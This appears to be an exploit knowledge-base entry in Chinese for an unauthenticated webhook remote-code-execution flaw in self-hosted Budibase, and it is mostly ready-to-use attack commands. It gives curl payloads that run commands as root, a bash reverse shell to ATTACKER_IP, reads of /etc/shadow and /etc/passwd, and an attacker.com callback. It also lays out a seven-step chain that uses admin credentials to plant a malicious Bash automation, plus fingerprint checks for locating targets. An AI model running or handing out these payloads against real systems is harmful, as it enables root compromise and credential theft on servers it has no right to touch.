---
id: BUDIBASE-UNAUTH-RCE
title: Budibase 未授权 Webhook RCE
product: budibase
vendor: Budibase
version_affected: "自托管版本（SELF_HOSTED=1）"
severity: CRITICAL
tags: [rce, webhook, command_injection, low_code, 无需认证]
fingerprint: ["budibase", "/api/webhooks/", "budibase.com", "/builder/", "Budibase"]
---

## 漏洞描述

Budibase 是开源低代码平台。CVE-2026-35216: `/api/webhooks/trigger/{appId}/{webhookId}` 端点无需认证，当管理员创建了包含 Webhook 触发器 + Bash 步骤的自动化流程时，攻击者可通过 Webhook 发送恶意命令，以 root 身份执行任意代码。

**前提条件**: 管理员已创建并发布包含 Webhook + Bash 步骤的自动化（使用模板变量如 `{{ trigger.cmd }}`）。

## 影响版本

- Budibase 自托管版本（SELF_HOSTED=1）

## 前置条件

- 目标运行 Budibase 自托管版本且可通过网络访问
- 管理员已创建并发布包含 Webhook 触发器 + Bash 步骤的自动化流程
- 需要知道 production appId 和 webhookId（可通过枚举或信息泄露获取）
- 无需认证即可触发 Webhook

## 利用步骤

### 未认证 RCE

```bash
# 只需知道 production appId 和 webhookId
PROD_APP_ID="app_c999265f6f984e3aa986788723984cd5"
WEBHOOK_ID="wh_f811a038ed024da78b44619353d4af2b"

# 无需认证 — 直接执行命令
curl -X POST "http://TARGET:10000/api/webhooks/trigger/$PROD_APP_ID/$WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id"}'
```

**攻击链**:
```
POST /api/webhooks/trigger/{appId}/{webhookId}  ← 无认证
  → controller.trigger()
  → triggers.externalTrigger()
  → webhook fields 扁平化到 automation context
  → automation.steps[EXECUTE_BASH].run()
  → processStringSync("{{ trigger.cmd }}", { cmd: "ATTACKER_PAYLOAD" })
  → execSync("ATTACKER_PAYLOAD")  ← 以 root 身份 RCE
```

### 反弹 Shell

```bash
curl -X POST "http://TARGET:10000/api/webhooks/trigger/$PROD_APP_ID/$WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""}'
```

### 读取敏感文件

```bash
curl -X POST "http://TARGET:10000/api/webhooks/trigger/$PROD_APP_ID/$WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"cat /etc/shadow"}'
```

### 如果已有管理员凭据 — 完整利用链

```bash
# 1. 认证
curl -c cookies.txt -X POST http://TARGET:10000/api/global/auth/default/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@company.com","password":"adminpassword"}'

# 2. 创建应用
APP_ID=$(curl -sb cookies.txt -X POST http://TARGET:10000/api/applications \
  -H "Content-Type: application/json" \
  -d '{"name":"MyApp","useTemplate":false,"url":"/myapp"}' | jq -r '.appId')

# 3. 创建含 Webhook+Bash 的自动化
AUTO_ID=$(curl -sb cookies.txt -X POST http://TARGET:10000/api/automations/ \
  -H "Content-Type: application/json" \
  -H "x-budibase-app-id: $APP_ID" \
  -d '{
    "name":"RCE","type":"automation",
    "definition":{
      "trigger":{"id":"t1","name":"Webhook","event":"app:webhook:trigger","stepId":"WEBHOOK","type":"TRIGGER","inputs":{},"schema":{"inputs":{"properties":{}},"outputs":{"properties":{"body":{"type":"object"}}}}},
      "steps":[{"id":"b1","name":"Bash","stepId":"EXECUTE_BASH","type":"ACTION","inputs":{"code":"{{ trigger.cmd }}"},"schema":{"inputs":{"properties":{"code":{"type":"string"}}},"outputs":{"properties":{"stdout":{"type":"string"},"success":{"type":"boolean"}}}}}]
    }
  }' | jq -r '.automation._id')

# 4. 启用自动化（新创建的默认禁用）
AUTO=$(curl -sb cookies.txt "http://TARGET:10000/api/automations/$AUTO_ID" \
  -H "x-budibase-app-id: $APP_ID")
echo "$AUTO" | python3 -c "import sys,json; d=json.load(sys.stdin); d['disabled']=False; print(json.dumps(d))" | \
  curl -sb cookies.txt -X PUT http://TARGET:10000/api/automations/ \
  -H "Content-Type: application/json" \
  -H "x-budibase-app-id: $APP_ID" -d @-

# 5. 创建 Webhook
WEBHOOK_ID=$(curl -sb cookies.txt -X PUT "http://TARGET:10000/api/webhooks/" \
  -H "Content-Type: application/json" \
  -H "x-budibase-app-id: $APP_ID" \
  -d "{\"name\":\"rce\",\"action\":{\"type\":\"automation\",\"target\":\"$AUTO_ID\"}}" | jq -r '.webhook._id')

# 6. 发布应用
curl -sb cookies.txt -X POST "http://TARGET:10000/api/applications/$APP_ID/publish" \
  -H "x-budibase-app-id: $APP_ID"

# 7. 触发 RCE（无认证）
PROD_APP_ID=$(echo $APP_ID | sed 's/_dev_/_/')
curl -X POST "http://TARGET:10000/api/webhooks/trigger/$PROD_APP_ID/$WEBHOOK_ID" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id && whoami && cat /etc/passwd"}'
```

**注意**: Bash 步骤仅在 `SELF_HOSTED=1` 时可用（所有自托管部署均满足）。

## Payload

### 未认证 RCE

```bash
curl -X POST "http://target:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id"}'
```

### 读取敏感文件

```bash
curl -X POST "http://target:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"cat /etc/shadow"}'
```

### 反弹 Shell

```bash
curl -X POST "http://target:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""}'
```

## 验证方法

- 响应中包含命令执行结果（如 `uid=0(root) gid=0(root)`）即确认 RCE
- 若 Bash 步骤输出未直接回显，可使用 DNS/HTTP 外带验证：`curl http://attacker.com/callback`

```bash
curl -s -X POST "http://target:10000/api/webhooks/trigger/<PROD_APP_ID>/<WEBHOOK_ID>" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"id"}' | grep -i "uid="
```

## 指纹确认

```bash
curl -s http://target:10000/ | grep -i budibase
curl -s http://target:10000/api/global/configs/checklist
curl -s -I http://target:10000/ | grep -i "budibase\|x-budibase"
```
